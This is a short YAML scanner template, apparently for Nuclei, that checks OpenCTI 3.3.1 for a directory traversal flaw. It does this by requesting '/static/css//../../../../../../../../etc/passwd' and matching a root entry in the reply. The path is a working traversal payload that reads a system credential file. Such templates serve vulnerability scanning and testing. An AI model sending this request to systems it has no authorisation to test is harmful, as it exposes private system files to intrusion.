id: opencti-lfi
info:
  author: 0x_Akoko
  name: OpenCTI 3.3.1 - Directory Traversal
  reference: https://cxsecurity.com/issue/WLB-2020060078
  severity: high
  tags: opencti,lfi
requests:
- matchers:
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/static/css//../../../../../../../../etc/passwd'
